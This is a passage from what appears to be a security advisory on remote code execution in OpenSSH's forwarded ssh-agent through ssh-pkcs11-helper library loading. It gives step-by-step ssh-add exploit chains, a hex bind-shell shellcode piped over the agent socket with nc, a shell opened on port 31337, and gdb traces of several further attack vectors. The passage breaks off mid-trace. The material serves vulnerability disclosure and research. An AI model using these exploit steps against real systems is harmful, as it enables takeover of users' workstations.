  <https://shell-storm.org/shellcode/files/shellcode-858.html>);

- /usr/lib/modules is an existing directory whose path matches
  ssh-agent's /usr/lib* allow-list (indeed, we do not want to actually
  load a shared library here -- we just want to store our shellcode in
  the executable stack);

------------------------------------------------------------------------

3c/ we remotely register a SIGSEGV handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/titan/libttcn3-rt2-dynamic.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely replace the unmapped SIGSEGV handler's code with another
piece of code (a useful gadget) from another shared library:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0": agent refused operation

------------------------------------------------------------------------

3e/ we remotely raise a SIGSEGV in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3f/ the replacement code (gadget) is executed (instead of the unmapped
SIGSEGV handler's code) and jumps to the stack, into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
alice       1105  0.0  0.1   7968  4192 ?        Ss   09:48   0:00 ssh-agent -s
alice       1249  0.0  0.0   2888   956 ?        S    10:03   0:00  \_ [sh]
alice       1268  0.0  0.0   7204  3092 ?        R    10:14   0:00      \_ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGSEGV handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1307
...
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fb15c9b560e in std::_Rb_tree_decrement(std::_Rb_tree_node_base*) () from /lib/x86_64-linux-gnu/libstdc++.so.6

(gdb) stepi
0x00007fb15d0e1250 in ?? () from /lib/x86_64-linux-gnu/libQt5Widgets.so.5

(gdb) x/10i 0x00007fb15d0e1250
=> 0x7fb15d0e1250:      add    %rcx,%rdx
   0x7fb15d0e1253:      notrack jmp *%rdx
   ...

(gdb) stepi
0x00007fb15d0e1253 in ?? () from /lib/x86_64-linux-gnu/libQt5Widgets.so.5

(gdb) stepi
0x00007ffc2ec82691 in ?? ()

(gdb) x/10i 0x00007ffc2ec82691
=> 0x7ffc2ec82691:      nop
   0x7ffc2ec82692:      nop
   0x7ffc2ec82693:      nop
   0x7ffc2ec82694:      nop
   0x7ffc2ec82695:      nop
   0x7ffc2ec82696:      nop
   0x7ffc2ec82697:      nop
   0x7ffc2ec82698:      nop
   0x7ffc2ec82699:      nop
   0x7ffc2ec8269a:      nop

(gdb) !grep stack /proc/1307/maps
7ffc2ec66000-7ffc2ec87000 rwxp 00000000 00:00 0                          [stack]

========================================================================
Signal handler use-after-free (Ubuntu Desktop 21.10)
========================================================================

In this subsection, we present one of the various combinations of shared
libraries that result in a reliable, one-shot remote code execution in
ssh-agent on Ubuntu Desktop 21.10.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 21.10
(<https://old-releases.ubuntu.com/releases/21.10/ubuntu-21.10-desktop-amd64.iso>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# echo 'deb <https://old-releases.ubuntu.com/ubuntu/> impish main restricted universe' > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three extra shared libraries used in this attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install syslinux-common
workstation# apt-get --no-install-recommends install libgnatcoll-postgres1
workstation# apt-get --no-install-recommends install libenca-dbg

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 912

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-GnpGKph6xbe3/agent.911

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding:

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

server# export SSH_AUTH_SOCK=/tmp/ssh-30N8pjTKWn/agent.996

server# ssh-add -s /usr/lib/syslinux/modules/efi64/gfxboot.c32
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/syslinux/modules/efi64/gfxboot.c32": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack of ssh-pkcs11-helper:

server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3c/ we remotely alter the mmap layout of ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely register a SIGBUS handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1": agent refused operation

------------------------------------------------------------------------

3e/ we remotely alter the mmap layout of ssh-pkcs11-helper (again), and
replace the unmapped SIGBUS handler's code with another piece of code (a
useful gadget) from another shared library:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-http-protocol-unix.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/sane/libsane-hp.so.1.0.32
server# ssh-add -s /usr/lib/libreoffice/program/libindex_data.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/gstreamer-1.0/libgstaudiorate.so
server# ssh-add -s /usr/lib/libreoffice/program/libscriptframe.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libisccc-9.16.15-Ubuntu.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libxkbregistry.so.0.0.0

------------------------------------------------------------------------

3f/ we remotely raise a SIGBUS in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/debug/.build-id/15/c0bee6bcb06fbf381d0e0e6c52f71e1d1bd694.debug
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3g/ the replacement code (gadget) is executed (instead of the unmapped
SIGBUS handler's code) and jumps to the stack, then into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
alice        912  0.0  0.0   6060  2312 ?        Ss   17:18   0:00 ssh-agent -s
alice        928  0.0  0.0   2872   956 ?        S    17:25   0:00  \_ [sh]
alice        953  0.0  0.0   7060  3068 ?        R    17:40   0:00      \_ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGBUS handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1225
...
(gdb) continue
Continuing.

Program received signal SIGBUS, Bus error.
memset () at ../sysdeps/x86_64/multiarch/memset-vec-unaligned-erms.S:186

(gdb) stepi
0x00007f2ba9d7c350 in ?? () from /usr/lib/libreoffice/program/libuno_cppuhelpergcc3.so.3

(gdb) x/10i 0x00007f2ba9d7c350
=> 0x7f2ba9d7c350:      add    $0x28,%rsp
   0x7f2ba9d7c354:      mov    %r12,%rax
   0x7f2ba9d7c357:      pop    %rbx
   0x7f2ba9d7c358:      pop    %rbp
   0x7f2ba9d7c359:      pop    %r12
   0x7f2ba9d7c35b:      pop    %r13
   0x7f2ba9d7c35d:      pop    %r14
   0x7f2ba9d7c35f:      pop    %r15
   0x7f2ba9d7c361:      ret
   ...

(gdb) stepi
...
0x00007f2ba9d7c361 in ?? () from /usr/lib/libreoffice/program/libuno_cppuhelpergcc3.so.3

(gdb) stepi
0x00007fff7aae5e90 in ?? ()

(gdb) x/10i 0x00007fff7aae5e90
=> 0x7fff7aae5e90:      add    %dl,(%rax)
   0x7fff7aae5e92:      and    %eax,(%rax)
   0x7fff7aae5e94:      add    %al,(%rax)
   0x7fff7aae5e96:      add    %al,(%rax)
   0x7fff7aae5e98:      add    %ah,(%rax)
   0x7fff7aae5e9a:      and    %eax,(%rax)
   0x7fff7aae5e9c:      add    %al,(%rax)
   0x7fff7aae5e9e:      add    %al,(%rax)
   0x7fff7aae5ea0:      call   0x7fff7aae7fbe
   ...

(gdb) stepi
...
0x00007fff7aae5ea0 in ?? ()

(gdb) stepi
0x00007fff7aae7fbe in ?? ()

(gdb) x/10i 0x00007fff7aae7fbe
=> 0x7fff7aae7fbe:      nop
   0x7fff7aae7fbf:      nop
   0x7fff7aae7fc0:      nop
   0x7fff7aae7fc1:      nop
   0x7fff7aae7fc2:      nop
   0x7fff7aae7fc3:      nop
   0x7fff7aae7fc4:      nop
   0x7fff7aae7fc5:      nop
   0x7fff7aae7fc6:      nop
   0x7fff7aae7fc7:      nop

(gdb) !grep stack /proc/1225/maps
7fff7aacb000-7fff7aaeb000 rwxp 00000000 00:00 0                          [stack]

========================================================================
Callback function use-after-free
========================================================================

While analyzing the first results of our fuzzer, we noticed that some
combinations of shared libraries jump to the stack although they do not
register any signal handler or raise any signal; how is this possible?
On investigation, we understood that:

- a core library (for example, libgcrypt.so or libQt5Core.so) is loaded
  but not unloaded (munmap()ed) by dlclose(), because it is marked as
  "nodelete" by the loader;

- a shared library (for example, libgnunetutil.so or gammaray_probe.so)
  is loaded and registers a userland callback function with the core
  library (via gcry_set_allocation_handler() or qtHookData[], for
  example), but it does not deregister this callback function when
  dlclose()d (i.e., when its code is munmap()ed);

- another shared library is loaded (mmap()ed) and replaces the unmapped
  callback function's code with another piece of code (a useful gadget);

- yet another shared library is loaded and calls one of the core
  library's functions, which in turn calls the unmapped callback
  function and therefore executes the replacement code (the useful
  gadget) instead, thus jumping to the stack.

------------------------------------------------------------------------

In the following example, one of the core library's functions is called
at line 66254, the unmapped callback function is called at line 66288,
the replacement code (gadget) is executed instead at line 66289, and
jumps to the stack at line 66293 (ssh-pkcs11-helper segfaults here
because we did not make the stack executable):

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3628979
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fff5000d9d0 in ?? ()

(gdb) !grep stack /proc/3628979/maps
7fff4fff3000-7fff50014000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
66254      0x00007f9ae7d82df4:  call   0x7f9ae7d70180 <gcry_mpi_new@plt>
66255      0x00007f9ae7d70180 <gcry_mpi_new@...+0>:     endbr64
66256      0x00007f9ae7d70184 <gcry_mpi_new@...+4>:     bnd jmp *0x7aa9d(%rip)        # 0x7f9ae7deac28 <gcry_mpi_new@....plt>
66257      0x00007f9af801bbe0 <gcry_mpi_new+0>: endbr64
66258      0x00007f9af801bbe4 <gcry_mpi_new+4>: push   %r12
66259      0x00007f9af801bbe6 <gcry_mpi_new+6>: push   %rbx
66260      0x00007f9af801bbe7 <gcry_mpi_new+7>: lea    0x3f(%rdi),%ebx
66261      0x00007f9af801bbea <gcry_mpi_new+10>:        mov    $0x18,%edi
66262      0x00007f9af801bbef <gcry_mpi_new+15>:        shr    $0x6,%ebx
66263      0x00007f9af801bbf2 <gcry_mpi_new+18>:        sub    $0x8,%rsp
66264      0x00007f9af801bbf6 <gcry_mpi_new+22>:        call   0x7f9af801bb40
66265      0x00007f9af801bb40:  endbr64
...
66285      0x00007f9af809cc60:  mov    0xa8311(%rip),%rax        # 0x7f9af8144f78
66286      0x00007f9af809cc67:  test   %rax,%rax
66287      0x00007f9af809cc6a:  jne    0x7f9af809cc44
66288      0x00007f9af809cc44:  call   *%rax

66289      0x00007f9afc27edc0:  cmp    %eax,%ebx
66290      0x00007f9afc27edc2:  jne    0x7f9afc27f150
66291      0x00007f9afc27f150:  mov    %r14,%rsi
66292      0x00007f9afc27f153:  mov    %r13,%rdi
66293      0x00007f9afc27f156:  call   *%rbx

------------------------------------------------------------------------

In the following example, the unmapped callback function is called at
line 87352, the replacement code (gadget) is executed instead at line
87353, and jumps to the stack at line 87354:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3628993
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffe4fc16d10 in ?? ()

(gdb) !grep stack /proc/3628993/maps
7ffe4fbfc000-7ffe4fc1d000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
87347      0x00007f35f8972d26 <_ZN7QObjectC2ER14QObjectPrivatePS_+182>: lea    0x26acd3(%rip),%rax        # 0x7f35f8bdda00 <qtHookData>
87348      0x00007f35f8972d2d <_ZN7QObjectC2ER14QObjectPrivatePS_+189>: mov    0x18(%rax),%rax
87349      0x00007f35f8972d31 <_ZN7QObjectC2ER14QObjectPrivatePS_+193>: test   %rax,%rax
87350      0x00007f35f8972d34 <_ZN7QObjectC2ER14QObjectPrivatePS_+196>: jne    0x7f35f8972d88 <_ZN7QObjectC2ER14QObjectPrivatePS_+280>
87351      0x00007f35f8972d88 <_ZN7QObjectC2ER14QObjectPrivatePS_+280>: mov    %rbx,%rdi
87352      0x00007f35f8972d8b <_ZN7QObjectC2ER14QObjectPrivatePS_+283>: call   *%rax

87353      0x00007f35fa445130 <_ZN5KAuth15ObjectDecorator13setAuthActionERKNS_6ActionE+80>:     pop    %rbp
87354      0x00007f35fa445131 <_ZN5KAuth15ObjectDecorator13setAuthActionERKNS_6ActionE+81>:     ret

------------------------------------------------------------------------

Note: several shared libraries that are installed by default on Ubuntu
Desktop (for example, gkm-*-store-standalone.so) do not have constructor
or destructor functions, but they are actual PKCS#11 providers, so some
of their functions are explicitly called by ssh-pkcs11-helper, and these
functions register a callback function with libgcrypt.so but they do not
deregister it when dlclose()d (i.e., when munmap()ed), thus exhibiting
the "Callback function use-after-free" behavior presented in this
subsection.

In the following example, one of libgcrypt.so's functions is called at
line 79114, the unmapped callback function is called at line 79143, the
replacement code (gadget) is executed instead at line 79144, and jumps
to the stack at line 79157:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3629085
...
(gdb) record btrace
(gdb) continue
Continuing.

Thread 1 "ssh-pkcs11-help" received signal SIGSEGV, Segmentation fault.
0x00007fffb2735c48 in ?? ()

(gdb) !grep stack /proc/3629085/maps
7fffb2716000-7fffb2737000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
79114      0x00007f8328147e3a:  call   0x7f8328135500 <gcry_mpi_scan@plt>
79115      0x00007f8328135500 <gcry_mpi_scan@...+0>:    endbr64
79116      0x00007f8328135504 <gcry_mpi_scan@...+4>:    bnd jmp *0x7a8dd(%rip)        # 0x7f83281afde8 <gcry_mpi_scan@....plt>
79117      0x00007f832e2b1220 <gcry_mpi_scan+0>:        endbr64
79118      0x00007f832e2b1224 <gcry_mpi_scan+4>:        sub    $0x8,%rsp
79119      0x00007f832e2b1228 <gcry_mpi_scan+8>:        call   0x7f832e32fbb0
79120      0x00007f832e32fbb0:  endbr64
...
79140      0x00007f832e2b436e:  mov    0x129dc3(%rip),%rax        # 0x7f832e3de138
79141      0x00007f832e2b4375:  test   %rax,%rax
79142      0x00007f832e2b4378:  je     0x7f832e2b43b0
79143      0x00007f832e2b437a:  jmp    *%rax

79144      0x00007f832ed274f0:  and    $0x20,%al
79145      0x00007f832ed274f2:  mov    %rax,0x50(%rsp)
79146      0x00007f832ed274f7:  mov    0x30(%rsp),%r13d
79147      0x00007f832ed274fc:  mov    0x58(%rsp),%r15
79148      0x00007f832ed27501:  mov    %ebx,%ebp
79149      0x00007f832ed27503:  mov    %r8d,%edx
79150      0x00007f832ed27506:  mov    0x50(%rsp),%rsi
79151      0x00007f832ed2750b:  mov    0x28(%rsp),%r14
79152      0x00007f832ed27510:  movslq 0x38(%r12),%rax
79153      0x00007f832ed27515:  sub    $0x8000,%ebp
79154      0x00007f832ed2751b:  mov    0x54(%r12),%ecx
79155      0x00007f832ed27520:  add    %rax,%r14
79156      0x00007f832ed27523:  mov    %r14,%rdi
79157      0x00007f832ed27526:  call   *%r15

========================================================================
Return from syscall use-after-free
========================================================================

While analyzing the strace logs of the dlopen() and dlclose() of every
shared library in /usr/lib*, we spotted an unusual SIGSEGV:

- a shared library is loaded, and its constructor function starts a
  thread that sleeps for 10 seconds in kernel-land:

------------------------------------------------------------------------
3631347 openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/cmpi/libcmpiOSBase_ProcessorProvider.so", O_RDONLY|O_CLOEXEC) = 3
...
3631347 mmap(NULL, 33296, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f5f3c3fb000
3631347 mmap(0x7f5f3c3fd000, 12288, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f5f3c3fd000
3631347 mmap(0x7f5f3c400000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x5000) = 0x7f5f3c400000
3631347 mmap(0x7f5f3c402000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) = 0x7f5f3c402000
3631347 close(3)                        = 0
...
3631347 clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, child_tid=0x7f5f3bd70910, parent_tid=0x7f5f3bd70910, exit_signal=0, stack=0x7f5f3b570000, stack_size=0x7fff00, tls=0x7f5f3bd70640} => {parent_tid=[3631372]}, 88) = 3631372
...
3631372 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=10, tv_nsec=0},  <unfinished ...>
------------------------------------------------------------------------

- meanwhile, the main thread (ssh-pkcs11-helper) unloads this shared
  library (because it is not an actual PKCS#11 provider) and therefore
  munmap()s the code where the sleeping thread should return to after
  its sleep in kernel-land:

------------------------------------------------------------------------
3631347 socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 3
3631347 connect(3, {sa_family=AF_UNIX, sun_path="/dev/log"}, 110) = 0
3631347 sendto(3, "<35>Jun 22 18:35:25 ssh-pkcs11-helper[3631347]: error: dlsym(C_GetFunctionList) failed: /usr/lib/x86_64-linux-gnu/cmpi/libcmpiOSBase_ProcessorProvider.so: undefined symbol: C_GetFunctionList", 190, MSG_NOSIGNAL, NULL, 0) = 190
3631347 close(3)                        = 0
3631347 munmap(0x7f5f3c3fb000, 33296)   = 0
------------------------------------------------------------------------

- the sleeping thread returns from kernel-land and crashes with a
  SIGSEGV because its userland code (at 0x7f5f3c3fecff) was unmapped:

------------------------------------------------------------------------
3631372 <... clock_nanosleep resumed>0x7f5f3bd6fde0) = 0
3631372 --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7f5f3c3fecff} ---
------------------------------------------------------------------------

Of course, we can request ssh-pkcs11-helper to load (mmap()) a
"nodelete" library before the sleeping thread returns from kernel-land,
thus replacing the unmapped userland code with another piece of code (a
hopefully useful gadget). In the following example, the sleeping thread
returns from kernel-land after line 214, executes the replacement code
(gadget) at line 256, and jumps to the stack at line 1305:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3631531
...
(gdb) record btrace
(gdb) continue
Continuing.
...
Thread 2 "ssh-pkcs11-help" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7f4603960640 (LWP 3631561)]
0x00007ffe2196f180 in ?? ()

(gdb) !grep stack /proc/3631531/maps
7ffe21955000-7ffe21976000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size unlimited
(gdb) record instruction-history
...
214        0x00007f4604b71866 <__GI___clock_nanosleep+198>:     syscall
...
240        0x00007f4604b71831 <__GI___clock_nanosleep+145>:     ret
...
244        0x00007f4604b766ef <__GI___nanosleep+31>:    ret
...
255        0x00007f4604b7663d <__sleep+93>:     ret

256        0x00007f46050fecff:  jmp    0x7f4604662e54 <__ieee754_j1f128+2276>
257        0x00007f4604662e54 <__ieee754_j1f128+2276>:  movq   0x60(%rsp),%mm3
...
1304       0x00007f460466285b <__ieee754_j1f128+747>:   add    $0xc8,%rsp
1305       0x00007f4604662862 <__ieee754_j1f128+754>:   ret

========================================================================
Sigaltstack use-after-free
========================================================================

>From time to time, we noticed the following warning in the dmesg of our
fuzzing laptop:

------------------------------------------------------------------------
[585902.691238] signal: ssh-pkcs11-help[1663008] overflowed sigaltstack
------------------------------------------------------------------------

On investigation, we discovered that at least one shared library
(libgnatcoll_postgres.so) calls sigaltstack() to register an alternate
signal stack (used by SA_ONSTACK signal handlers) when dlopen()ed, and
then munmap()s this signal stack without deregistering it (SS_DISABLE)
when dlclose()d. Consequently, we implemented and tested a different
attack idea:

- we randomly load zero or more shared libraries that permanently alter
  the mmap layout;

- we load libgnatcoll_postgres.so, which registers an alternate signal
  stack and then munmap()s it without deregistering it;

- we randomly load zero or more shared libraries that alter the mmap
  layout (again), and hopefully replace the unmapped signal stack with
  another writable memory mapping (for example, a thread stack, or a
  .data or .bss segment);

- we randomly load one shared library that registers an SA_ONSTACK
  signal handler but does not munmap() its code when dlclose()d (unlike
  our original "Signal handler use-after-free" attack);

- we randomly load one shared library that raises this signal and
  therefore calls the SA_ONSTACK signal handler, thus overwriting the
  replacement memory mapping with stack frames from the signal handler;

- we randomly load one or more shared libraries that hopefully use the
  overwritten contents of the replacement memory mapping.

Although we successfully found various combinations of shared libraries
that overwrite a .data or .bss segment with a stack frame from a signal
handler, we failed to overwrite a useful memory mapping with useful data
(e.g., we failed to magically jump to the stack); for this attack to
work, more research and a finer-grained approach might be required.

========================================================================
Sigreturn to arbitrary instruction pointer
========================================================================

Astonishingly, numerous combinations of shared libraries crash because
they try to execute code at 0xcccccccccccccccc: a direct control of the
instruction pointer (RIP), because these 0xcc bytes come from the stack
buffer of ssh-pkcs11-helper that we (remote attackers) filled with 0xcc
bytes.

Initially, we got very excited by this new attack vector, because we
thought that a gadget of the form "add rsp, N; ret" was executed, thus
moving the stack pointer (RSP) into our 0xcc-filled stack buffer and
popping RIP from there. Unfortunately, the reality is more complex:

- a shared library raises a signal (a SIGSEGV in the example below, at
  line 134110) and, in consequence of a "Signal handler use-after-free",
  a replacement gadget of the form "ret N" is executed instead of the
  signal handler (at line 134111);

- exactly as the real signal handler would, the replacement gadget
  returns to the glibc's restore_rt() function (at line 134112), which
  in turn calls the kernel's rt_sigreturn() function (at line 134113);

- however, before the kernel's rt_sigreturn() function is called, the
  replacement gadget "ret N" moves RSP into our 0xcc-filled stack buffer
  and as a result, the kernel's rt_sigreturn() function restores all
  userland registers (including RIP and RSP) from there;

------------------------------------------------------------------------
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3633914
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fcd468671b1 in xtables_register_target () from /lib/x86_64-linux-gnu/libxtables.so.12

(gdb) x/i 0x00007fcd468671b1
=> 0x7fcd468671b1 <xtables_register_target+209>:        movzbl 0x18(%rax),%eax

(gdb) info registers
rax            0x0                 0
...

(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xcccccccccccccccc in ?? ()

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
134106     0x00007fcd4686719e <xtables_register_target+190>:    mov    0x6e1b(%rip),%rax        # 0x7fcd4686dfc0
134107     0x00007fcd468671a5 <xtables_register_target+197>:    movzwl 0x22(%rbx),%edx
134108     0x00007fcd468671a9 <xtables_register_target+201>:    mov    (%rax),%rax
134109     0x00007fcd468671ac <xtables_register_target+204>:    mov    %dx,0x6(%rsp)
134110  [disabled]
134111     0x00007fcd48e434a0:  ret    $0x1f0f
134112     0x00007fcd49655520 <__restore_rt+0>: mov    $0xf,%rax
134113     0x00007fcd49655527 <__restore_rt+7>: syscall

(gdb) info registers
rax            0x0                 0
rbx            0xcccccccccccccccc  -3689348814741910324
rcx            0xcccccccccccccccc  -3689348814741910324
rdx            0xcccccccccccccccc  -3689348814741910324
rsi            0xcccccccccccccccc  -3689348814741910324
rdi            0xcccccccccccccccc  -3689348814741910324
rbp            0xcccccccccccccccc  0xcccccccccccccccc
rsp            0xcccccccccccccccc  0xcccccccccccccccc
r8             0xcccccccccccccccc  -3689348814741910324
r9             0xcccccccccccccccc  -3689348814741910324
r10            0xcccccccccccccccc  -3689348814741910324
r11            0xcccccccccccccccc  -3689348814741910324
r12            0xcccccccccccccccc  -3689348814741910324
r13            0xcccccccccccccccc  -3689348814741910324
r14            0xcccccccccccccccc  -3689348814741910324
r15            0xcccccccccccccccc  -3689348814741910324
rip            0xcccccccccccccccc  0xcccccccccccccccc
------------------------------------------------------------------------

Although we directly control all of the userland registers, we failed to
transform this attack vector into a one-shot remote exploit, because RSP
(which was conveniently pointing into our 0xcc-filled stack buffer) gets
overwritten, and because we were unable to leak any information from
ssh-pkcs11-helper (to defeat ASLR).

Partially overwriting a pointer that is left over in ssh-pkcs11-helper's
stack buffer, and that is later used by rt_sigreturn() to restore a
userland register, might be an interesting idea that we have not
explored yet.

========================================================================
_Unwind_Context type-confusion
========================================================================

This attack vector was the most puzzling of our discoveries: from time
to time, some combinations of shared libraries jumped to the stack, but
evidently not as a result of a signal handler, callback function, or
return from syscall use-after-free. Eventually, we determined the
sequence of events that led to these stack jumps:

- some shared libraries load LLVM's libunwind.so as a "nodelete" library
  (i.e., it is never unloaded, even after dlclose());

- some shared libraries throw a C++ exception, which loads GCC's
  libgcc_s.so and calls the _Unwind_GetCFA() function (at line 57295 in
  the example below);

- however, GCC's libgcc_s.so mistakenly calls LLVM's _Unwind_GetCFA()
  (at line 57298) instead of GCC's _Unwind_GetCFA() (because LLVM's
  libunwind.so was loaded first), and passes a pointer to GCC's struct
  _Unwind_Context to this function (instead of a pointer to LLVM's
  struct _Unwind_Context, which is a different type of structure);

- LLVM's _Unwind_GetCFA() then calls its unw_get_reg() function (at line
  57303), which in turn calls a function pointer (at line 57311) that is
  a member of LLVM's struct _Unwind_Context, but that happens to be a
  stack pointer in GCC's struct _Unwind_Context;

------------------------------------------------------------------------
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3635541
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffcf5e9be10 in ?? ()

(gdb) !grep stack /proc/3635541/maps
7ffcf5e82000-7ffcf5ea3000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
57295      0x00007f7c8eaaccf1:  call   0x7f7c8ea99470 <_Unwind_GetCFA@plt>

